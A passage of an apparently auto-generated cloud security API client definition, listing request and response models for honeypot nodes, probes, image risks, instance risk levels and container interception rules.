  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  nodeId?: string(name='NodeId', description='The ID of the management node.', example='7d110ca6-05ee-4149-8042-13ad1a41fd****', position='Query'),
  nodeName?: string(name='NodeName', description='The name of the management node.', example='cyct_cnymu', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20', position='Query'),
}

model ListHoneypotNodeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  honeypotNodeList?: [ 
    {
      allowHoneypotAccessInternet?: boolean(name='AllowHoneypotAccessInternet', description='Indicates whether a honeypot is allowed to access the Internet. Valid values:

*   **true**: The honeypot is allowed to access the Internet.
*   **false**: The honeypot is not allowed to access the Internet.', example='true'),
      createTime?: string(name='CreateTime', description='The time when the management node was created.', example='2022-08-04 15:52:56'),
      defaultNode?: boolean(name='DefaultNode', description='The type of the management node. Default value: **false**. Valid values:

*   **false**: non-default type
*   **true**: default type', example='false'),
      ecsInstanceId?: string(name='EcsInstanceId', description='The ID of the instance.', example='i-bp1fs3qsc1msa3512k****'),
      honeypotTotalCount?: int32(name='HoneypotTotalCount', description='The maximum number of honeypots that can be deployed to the management node.', example='10'),
      honeypotUsedCount?: int32(name='HoneypotUsedCount', description='The number of honeypots that are deployed to the management node.', example='2'),
      nodeId?: string(name='NodeId', description='The ID of the management node.', example='7d110ca6-05ee-4149-8042-13ad1a41fd****'),
      nodeIp?: string(name='NodeIp', description='The IP address of the management node.', example='119.180.XX.XX'),
      nodeName?: string(name='NodeName', description='The name of the management node.', example='cyct_cnymu'),
      probeTotalCount?: int32(name='ProbeTotalCount', description='The maximum number of probes that can be deployed for the management node.', example='5'),
      probeUsedCount?: int32(name='ProbeUsedCount', description='The number of probes that are deployed for the management node.', example='2'),
      securityGroupProbeIpList?: [ string ](name='SecurityGroupProbeIpList', description='An array consisting of the CIDR blocks that are allowed to access the management node.'),
      totalStatus?: int32(name='TotalStatus', description='The status of the management node. Valid values:

*   **1**: normal
*   **2**: abnormal', example='1'),
      upgradeAvailable?: boolean(name='UpgradeAvailable', description='Indicates whether the management node can be upgraded. Valid values:

*   **false**: no
*   **true**: yes', example='true'),
    }
  ](name='HoneypotNodeList', description='An array that consists of the information about the management nodes.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='149'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='337BEA70-B03D-5370-8420-436F3FCD9924'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ListHoneypotNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotNodeResponseBody(name='body'),
}

async function listHoneypotNode(request: ListHoneypotNodeRequest): ListHoneypotNodeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListHoneypotNode', 'POST', '/', 'json', false, 'json', request);
}

model ListHoneypotPresetRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  honeypotImageName?: string(name='HoneypotImageName', description='The name of the honeypot image.', example='ruoyi', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en', position='Query'),
  nodeId?: string(name='NodeId', description='The ID of the management node.', example='d892b4fe-af0d-4486-ab2a-8a518045****', position='Query'),
  nodeName?: string(name='NodeName', description='The name of the management node.', example='Node1', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20', position='Query'),
  presetName?: string(name='PresetName', description='The custom name of the honeypot template.', example='mx-rouyi', position='Query'),
}

model ListHoneypotPresetResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  list?: [ 
    {
      controlNodeName?: string(name='ControlNodeName', description='The name of the management node.', example='node1'),
      honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the honeypot image.', example='Metabase'),
      honeypotImageName?: string(name='HoneypotImageName', description='The name of the honeypot image.', example='metabase'),
      honeypotPresetId?: string(name='HoneypotPresetId', description='The ID of the honeypot template.', example='3cc04a47-7229-418c-8101-f10a2887****'),
      nodeId?: string(name='NodeId', description='The ID of the management node.', example='c94eff5b-ea48-4805-8b7f-e04d3509****'),
      presetName?: string(name='PresetName', description='The custom name of the honeypot template.', example='WebMin-online'),
      presetType?: string(name='PresetType', description='The type of the honeypot template. Valid values:

*   **TEMP**: automatically generated template
*   **CUSTOM**: custom template
*   **DEFAULT**: default template', example='CUSTOM'),
    }
  ](name='List', description='An array that consists of the honeypot templates.'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: 20.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='55'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0C656B33-0D6B-5953-A26A-D766BD75B44A'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ListHoneypotPresetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotPresetResponseBody(name='body'),
}

async function listHoneypotPreset(request: ListHoneypotPresetRequest): ListHoneypotPresetResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListHoneypotPreset', 'POST', '/', 'json', false, 'json', request);
}

model ListHoneypotProbeRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='1', position='Query'),
  displayName?: string(name='DisplayName', description='The name of the probe.', example='probe-test', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20', position='Query'),
  probeStatus?: string(name='ProbeStatus', description='The status of the probe. Valid values:

*   **installed**: installed
*   **install_failed**: installation failed
*   **online**: online
*   **offline**: offline
*   **unnormal**: abnormal
*   **unprobe**: unauthorized
*   **uninstalling**: being uninstalled
*   **uninstalled**: uninstalled
*   **uninstall_failed**: uninstallation failed
*   **not_exist**: not installed', example='online', position='Query'),
  probeType?: string(name='ProbeType', description='The type of the probe. Valid values:

*   **host_probe**: host probe
*   **vpc_black_hole_probe**: VPC probe', example='host_probe', position='Query'),
}

model ListHoneypotProbeResponseBody = {
  code?: string(name='Code', description='The status code that is returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code that is returned.', example='200'),
  list?: [ 
    {
      controlNode?: {
        ecsInstanceId?: string(name='EcsInstanceId', description='The ID of the Elastic Compute Service (ECS) instance.', example='i-uf6eq0rlvu1mkh0p****'),
        nodeId?: string(name='NodeId', description='The ID of the node.', example='8ec9da17-c0e7-4642-aad6-defc9722****'),
        nodeName?: string(name='NodeName', description='The name of the node.', example='HoneypotNode1'),
      }(name='ControlNode', description='The information about the management node.'),
      deployTime?: long(name='DeployTime', description='The time when the probe was deployed.', example='1669363825000'),
      displayName?: string(name='DisplayName', description='The name of the probe.', example='prod-pinpoint-hd1b'),
      hostIp?: string(name='HostIp', description='The IP address of the server on which the probe is installed.', example='33.53.XX.XX'),
      osType?: string(name='OsType', description='The operating system of the server on which the probe is deployed. Valid values:

*   windows
*   linux', example='windows'),
      probeId?: string(name='ProbeId', description='The ID of the probe.', example='4d167bb3-dd09-4a6a-a179-d5d6a5b0****'),
      probeType?: string(name='ProbeType', description='The type of the probe. Valid values:

*   **host_probe**: host probe
*   **vpc_black_hole_probe**: VPC probe', example='host_probe'),
      probeVersion?: string(name='ProbeVersion', description='The version of the probe.', example='18060096'),
      status?: string(name='Status', description='The status of the probe. Valid values:

*   **installed**: installed
*   **install_failed**: installation failed
*   **online**: online
*   **offline**: offline
*   **unnormal**: abnormal
*   **unprobe**: unauthorized
*   **uninstalling**: being uninstalled
*   **uninstalled**: uninstalled
*   **uninstall_failed**: uninstallation failed
*   **not_exist**: not installed', example='online'),
      uuid?: string(name='Uuid', description='The UUID of the server to which the host probe is deployed.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
      vpcId?: string(name='VpcId', description='The ID of the VPC in which the VPC probe is deployed.', example='vpc-5gu8iu68w9b472jbb****'),
    }
  ](name='List', description='An array that consists of the details about the probe.'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='30'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4BC9E610-21BE-537F-82EF-144A60D5A970'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ListHoneypotProbeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotProbeResponseBody(name='body'),
}

async function listHoneypotProbe(request: ListHoneypotProbeRequest): ListHoneypotProbeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListHoneypotProbe', 'POST', '/', 'json', false, 'json', request);
}

model ListHoneypotProbeUuidRequest {
  controlNodeId?: string(name='ControlNodeId', description='The ID of the management node.

>  You can call the [ListHoneypotNode](~~ListHoneypotNode~~) operation to obtain the ID.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and the response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  probeType?: string(name='ProbeType', description='The type of the probe. Valid values:

*   **host_probe**: host probe
*   **vpc_black_hole_probe**: virtual private cloud (VPC) probe', example='host_probe', position='Query'),
}

model ListHoneypotProbeUuidResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  count?: int32(name='Count', description='The total number of entries returned.', example='10'),
  data?: [ string ](name='Data', description='The resources of the probe.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='32C9C2A6-B837-538E-921B-90746CB*****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model ListHoneypotProbeUuidResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotProbeUuidResponseBody(name='body'),
}

async function listHoneypotProbeUuid(request: ListHoneypotProbeUuidRequest): ListHoneypotProbeUuidResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListHoneypotProbeUuid', 'POST', '/', 'json', false, 'json', request);
}

model ListImageRegistryRegionRequest {
}

model ListImageRegistryRegionResponseBody = {
  regions?: [ 
    {
      regionId?: string(name='RegionId', description='The region ID of the image.', example='cn-hangzhou'),
      regionName?: string(name='RegionName', description='The name of the region.', example='cn-hangzhou'),
    }
  ](name='Regions', description='An array that consists of regions.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='291B49F9-1685-4005-9D34-606B6F78****'),
}

model ListImageRegistryRegionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListImageRegistryRegionResponseBody(name='body'),
}

async function listImageRegistryRegion(request: ListImageRegistryRegionRequest): ListImageRegistryRegionResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListImageRegistryRegion', 'POST', '/', 'json', false, 'json', request);
}

model ListImageRiskRequest {
  appName?: string(name='AppName', description='The name of the application.', example='e****', position='Query'),
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the ID of the container cluster.', example='c80f79959fd724a888e1187779b13****', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  imageName?: string(name='ImageName', description='The name of the image.', example='container-***:****', position='Query'),
  namespace?: string(name='Namespace', description='The name of the namespace to which the repository belongs.', example='kube-sy****', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20', position='Query'),
}

model ListImageRiskResponseBody = {
  imageRiskList?: [ 
    {
      digest?: string(name='Digest', description='The digest value of the image.', example='3f8efc2184cf1d24936b49c27286a284714b77be34c80c9ee38ca6bf322445****'),
      endPointList?: [ 
        {
          domains?: [ string ](name='Domains', description='An array that consists the details of the domain name in the endpoint.'),
          type?: string(name='Type', description='The type of the domain name in the endpoint. Valid values:

*   **internet**: Internet
*   **intranet**: internal network', example='internet'),
        }
      ](name='EndPointList', description='An array that consists of the details of the endpoint.'),
      endpoints?: string(name='Endpoints', description='The endpoint of Container Registry.', example='https://172.20.XXX.XXX/test'),
      image?: string(name='Image', description='The image of the container.', example='.aliyuncs.com/sas_test/baseline:exploit'),
      imageAccessType?: string(name='ImageAccessType', description='The registration status of the image repository. Valid values:

*   **IN_SAS**: The image repository is registered with Security Center.
*   **NOT_IN_SAS**: The image repository is not registered with Security Center.', example='IN_SAS'),
      imageId?: string(name='ImageId', description='The ID of the image.', example='f922bfeb6960436fe3f0e7b62fc6b9a0b47980986669c367c22433269404****'),
      internetURLs?: string(name='InternetURLs', description='The public endpoint of the image repository.', example='****registry-registry.cn-shenzhen-finance-1.cr.aliyuncs.com/xxxx/docker-****'),
      regionId?: string(name='RegionId', description='The region of the image repository.', example='cn-hangzhou'),
      registryType?: string(name='RegistryType', description='The type of the image repository. Valid values:

*   **acr**
*   **harbor**
*   **quay**
*   **CI/CD**: Jenkins', example='harbor'),
      repoId?: string(name='RepoId', description='The ID of the image repository.', example='crr-bk2l746eyxca1****'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='scan_test'),
      repoNamespace?: string(name='RepoNamespace', description='The name of the namespace to which the repository belongs.', example='vultar***'),
      repoType?: string(name='RepoType', description='The type of the repository. Valid values:

*   `PUBLIC`
*   `PRIVATE`', example='PRIVATE'),
      statistics?: string(name='Statistics', description='The statistics on a security event.', example='{
	"baselineNum": 0,
	"newSuspicious": 0,
	"vul": 0
}'),
      tag?: string(name='Tag', description='The tag that is added to the image.', example='0.1.0'),
      tagImmutable?: int32(name='TagImmutable', description='Indicates whether the image version is immutable. If the image version is immutable, only the image of the latest version in the image repository can be overwritten. Valid values:

*   **0**: The image version is mutable.
*   **1**: The image version is immutable.', example='0'),
      uuid?: string(name='Uuid', description='The UUID of the image.', example='624778f3-5bf2-423c-ac0c-47a62c05****'),
      vpcURLs?: string(name='VpcURLs', description='The endpoint of the image repository in the VPC.', example='****-registry-registry-vpc.cn-shenzhen-finance-1.cr.aliyuncs.com/xxxx/docker-****'),
    }
  ](name='ImageRiskList', description='An array that consists of security information about the image.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='3'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='23'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='050ACC7A-D4FD-55C6-B861-BA9569C1****'),
}

model ListImageRiskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListImageRiskResponseBody(name='body'),
}

async function listImageRisk(request: ListImageRiskRequest): ListImageRiskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListImageRisk', 'POST', '/', 'json', false, 'json', request);
}

model ListInstanceCatalogRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  regionId?: string(name='RegionId', description='The ID of the region in which the asset resides. Valid values:

*   **cn-hangzhou**: International
*   **ap-southeast-1**: Singapore', example='cn-hangzhou', position='Query'),
  requirementIds?: [ long ](name='RequirementIds', description='The IDs of requirement items.', position='Query'),
  standardIds?: [ long ](name='StandardIds', description='The IDs of standards.', position='Query'),
  types?: [ string ](name='Types', description='The types of check standards.', position='Query'),
}

model ListInstanceCatalogResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0D42A83F-CE33-5F54-A5AE-05DA39F59E1B'),
  vendors?: [ 
    {
      instanceTypes?: [ 
        {
          instanceSubTypes?: [ 
            {
              name?: string(name='Name', description='The name of the asset subtype.', example='SECURITY_GROUP'),
            }
          ](name='InstanceSubTypes', description='An array that consists of asset subtypes.'),
          name?: string(name='Name', description='The name of the asset type.', example='ECS'),
        }
      ](name='InstanceTypes', description='An array that consists of asset types.'),
      name?: string(name='Name', description='The name of the service provider.', example='ALIYUN'),
    }
  ](name='Vendors', description='An array that consists of the asset types by service provider.'),
}

model ListInstanceCatalogResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListInstanceCatalogResponseBody(name='body'),
}

async function listInstanceCatalog(request: ListInstanceCatalogRequest): ListInstanceCatalogResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListInstanceCatalog', 'POST', '/', 'json', false, 'json', request);
}

model ListInstanceRiskLevelsRequest {
  instanceList?: [ 
    {
      instanceId?: string(name='InstanceId', description='The ID of the instance.', example='i-m5efigezp50l2cmb****'),
      uuid?: string(name='Uuid', description='The serial number of the instance.', example='f2d6e901-1004-4ca8-9dae-53ec04a9****'),
    }
  ](name='InstanceList', description='The instances.', position='Query'),
}

model ListInstanceRiskLevelsResponseBody = {
  instanceRiskLevels?: [ 
    {
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-m5efigezp50l2cmb****'),
      level?: string(name='Level', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**
*   **none**', example='high'),
      uuid?: string(name='Uuid', description='The UUID of the server for which you want to modify the defense rule. You can call the [DescribeCloudCenterInstances](~~141932~~) operation to query the UUIDs of servers.', example='f2d6e901-1004-4ca8-9dae-53ec04a92765'),
    }
  ](name='InstanceRiskLevels', description='The risk levels of instances.'),
  requestId?: string(name='RequestId', description='The request ID.', example='F5CF78A7-30AA-59DB-847F-13EE3AE7****'),
}

model ListInstanceRiskLevelsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListInstanceRiskLevelsResponseBody(name='body'),
}

async function listInstanceRiskLevels(request: ListInstanceRiskLevelsRequest): ListInstanceRiskLevelsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListInstanceRiskLevels', 'POST', '/', 'json', false, 'json', request);
}

model ListInstanceRiskNumRequest {
  instanceList?: [ 
    {
      instanceId?: string(name='InstanceId', example='i-wz9fdluqx20mp2x7****'),
      uuid?: string(name='Uuid', example='f2d6e901-1004-4ca8-9dae-53ec04a9****'),
    }
  ](name='InstanceList', position='Query'),
}

model ListInstanceRiskNumResponseBody = {
  instanceRiskNum?: [ 
    {
      instanceItem?: {
        instanceId?: string(name='InstanceId', example='i-wz9fdluqx20mp2x7****'),
        uuid?: string(name='Uuid', example='f2d6e901-1004-4ca8-9dae-53ec04a9****'),
      }(name='InstanceItem'),
      riskNumEntity?: {
        suspiciousHighCount?: int32(name='SuspiciousHighCount', example='5'),
        suspiciousLowCount?: int32(name='SuspiciousLowCount', example='7'),
        suspiciousMediumCount?: int32(name='SuspiciousMediumCount', example='6'),
        vulHighCount?: int32(name='VulHighCount', example='1'),
        vulLowCount?: int32(name='VulLowCount', example='3'),
        vulMediumCount?: int32(name='VulMediumCount', example='2'),
        weakPassWordCount?: int32(name='WeakPassWordCount', example='4'),
      }(name='RiskNumEntity'),
    }
  ](name='InstanceRiskNum'),
  requestId?: string(name='RequestId', example='291B49F9-1685-4005-9D34-606B6F78****'),
}

model ListInstanceRiskNumResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListInstanceRiskNumResponseBody(name='body'),
}

async function listInstanceRiskNum(request: ListInstanceRiskNumRequest): ListInstanceRiskNumResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListInstanceRiskNum', 'POST', '/', 'json', false, 'json', request);
}

model ListInterceptionHistoryRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.', example='c7c190a82d9a048be9038d352840f****', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  endTime?: long(name='EndTime', description='The end of the time range to query. The value is a UNIX timestamp.', example='1635575219000', position='Query'),
  historyName?: string(name='HistoryName', description='The name of the alert.', example='Abnormal access', position='Query'),
  interceptionTypes?: [ int32 ](name='InterceptionTypes', description='The types of exceptions.', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20', position='Query'),
  startTime?: long(name='StartTime', description='The start of the time range to query. The value is a UNIX timestamp.', example='1651290987000', position='Query'),
}

model ListInterceptionHistoryResponseBody = {
  interceptionHistoryList?: [ 
    {
      clusterId?: string(name='ClusterId', description='The ID of the container cluster.', example='c556c8133b5ad4378b7fc533ddbda****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='opa-terway-nonet****'),
      dstAppName?: string(name='DstAppName', description='The name of the destination application.', example='sas-web****'),
      dstNamespace?: string(name='DstNamespace', description='The destination namespace.', example='service****'),
      dstPort?: long(name='DstPort', description='The destination port range configured for the defense rule.', example='33'),
      dstRuleTargetName?: string(name='DstRuleTargetName', description='The name of the destination network object.', example='sas-web****'),
      firstTime?: long(name='FirstTime', description='The timestamp when the alert was first generated on the current day.', example='1639718858000'),
      id?: long(name='Id', description='The ID of the alert.', example='1126'),
      interceptionName?: long(name='InterceptionName', description='The name of the alert.', example='Abnormal access'),
      interceptionType?: int32(name='InterceptionType', description='The handling type. Valid values:

*   **0**: monitor
*   **1**: intercept
*   **2**: generate alert
*   **3**: allow', example='0'),
      lastTime?: long(name='LastTime', description='The timestamp when the alert was last generated on the current day.', example='1639731078000'),
      realDstAppName?: string(name='RealDstAppName', description='The name of the destination application.', example='sas-service****'),
      realDstImageName?: string(name='RealDstImageName', description='The name of the destination image.', example='sas-servi****'),
      realDstNamespace?: string(name='RealDstNamespace', description='The destination namespace.', example='service****'),
      realDstPodName?: string(name='RealDstPodName', description='The destination pod.', example='sas-web-84cc7dd9****'),
      realInterceptionType?: int32(name='RealInterceptionType', description='The handling type of actual hits. Valid values:

*   **0**: monitor
*   **1**: intercept
*   **2**: generate alert
*   **3**: allow', example='0'),
      realSrcAppName?: string(name='RealSrcAppName', description='The name of the source application.', example='sas-service****'),
      realSrcImageName?: string(name='RealSrcImageName', description='The name of the source image.', example='sas-servi****'),
      realSrcNamespace?: string(name='RealSrcNamespace', description='The source namespace.', example='service****'),
      realSrcPodName?: string(name='RealSrcPodName', description='The source pod.', example='sas-service-757b9d****'),
      riskLevel?: long(name='RiskLevel', description='The risk level. Valid values:

*   **-1**: unknown
*   **0**: none
*   **1**: low
*   **2**: medium
*   **3**: high', example='1'),
      ruleId?: long(name='RuleId', description='The ID of the defense rule based on which the alert was generated.', example='136'),
      ruleName?: string(name='RuleName', description='The name of the defense rule.', example='all****'),
      srcAppName?: string(name='SrcAppName', description='The name of the source application.', example='sas-web****'),
      srcNamespace?: string(name='SrcNamespace', description='The source namespace.', example='service****'),
      srcRuleTargetName?: string(name='SrcRuleTargetName', description='The name of the source network object.', example='sas-web****'),
      status?: long(name='Status', description='The handling status. Valid values:

*   **0**: unhandled
*   **1**: handled
*   **2**: manually handled
*   **3**: ignored', example='1'),
      tryCount?: int32(name='TryCount', description='The number of attempts.', example='34'),
    }
  ](name='InterceptionHistoryList', description='An array that consists of the alerts generated by defense rules.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='45'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D81DD78E-E006-5C65-A171-C8CB0904****'),
}

model ListInterceptionHistoryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListInterceptionHistoryResponseBody(name='body'),
}

async function listInterceptionHistory(request: ListInterceptionHistoryRequest): ListInterceptionHistoryResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListInterceptionHistory', 'POST', '/', 'json', false, 'json', request);
}

model ListInterceptionRulePageRequest {
  clusterId: string(name='ClusterId', description='The ID of the container cluster.', example='cc41de13ab5474210bc0ce772a009****', position='Query'),
  criteria?: string(name='Criteria', description='The query condition.', example='80', position='Query'),
  criteriaType?: string(name='CriteriaType', description='The type of the query condition. Valid values:

*   **ID**
*   **RULE_NAME**
*   **SRC_TARGET**
*   **DST_TARGET**
*   **DST_PORT**
*   **RULE_SWITCH**
*   **INTERCEPTOR_TYPE**', example='DST_PORT', position='Query'),
  currentPage: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  pageSize: int32(name='PageSize', description='The number of entries to return on each page.', example='50', position='Query'),
}

model ListInterceptionRulePageResponseBody = {
  interceptionRuleList?: [ 
    {
      dstTarget?: {
        appName?: string(name='AppName', description='The name of the application.', example='console'),
        imageList?: [ string ](name='ImageList', description='An array that consists of the affected images.'),
        namespace?: string(name='Namespace', description='The namespace.', example='test'),
        ports?: [ string ](name='Ports', description='An array that consists of information about the ports used by the destination server.'),
        ruleType?: string(name='RuleType', description='The type of the defense rule. Valid values:

*   **suggest**: intelligently recommended rule
*   **customize**: custom rule
*   **system**: system rule', example='customize'),
        tagList?: [ string ](name='TagList', description='An array that consists of tags added to the destination network object.'),
        targetId?: int32(name='TargetId', description='The ID of the network object.', example='302001'),
        targetName?: string(name='TargetName', description='The name of the network object.', example='demo4****'),
        targetType?: string(name='TargetType', description='The type of the network object.', example='IMAGE'),
      }(name='DstTarget', description='The destination network object.'),
      interceptType?: long(name='InterceptType', description='The interception mode. Valid values:

*   **0**: monitor
*   **1**: block
*   **2**: alert
*   **3**: allow', example='1'),
      orderIndex?: long(name='OrderIndex', description='The order in which the entries are sorted.', example='1'),
      ruleId?: long(name='RuleId', description='The ID of the defense rule.', example='30****'),
      ruleName?: string(name='RuleName', description='The name of the defense rule.', example='test'),
      ruleSwitch?: int32(name='RuleSwitch', description='The status of the defense rule. Valid values:

*   **1**: enabled
*   **0**: disabled', example='1'),
      ruleType?: string(name='RuleType', description='The type of the defense rule.', example='customize'),
      srcTarget?: {
        appName?: string(name='AppName', description='The name of the application.', example='ack-jenkins-lawr****'),
        imageList?: [ string ](name='ImageList', description='An array that consists of the images of the network object.'),
        namespace?: string(name='Namespace', description='The namespace.', example='jenkins'),
        ruleType?: string(name='RuleType', description='The type of the defense rule. Valid values:

*   **suggest**: intelligently recommended rule
*   **customize**: custom rule
*   **system**: system rule', example='customize'),
        tagList?: [ string ](name='TagList', description='An array that consists of tags added to the source network object.'),
        targetId?: int32(name='TargetId', description='The ID of the network object.', example='40****'),
        targetName?: string(name='TargetName', description='The name of the network object.', example='mhh-te****'),
        targetType?: string(name='TargetType', description='The type of the affected assets.', example='containerId'),
      }(name='SrcTarget', description='The source network object.'),
    }
  ](name='InterceptionRuleList', description='An array that consists of information about the defense rules.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='19'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='ACF97412-FD09-4D1F-994F-34DF12BR****'),
}

model ListInterceptionRulePageResponse = {
  headers: map[string]string(name='headers'),
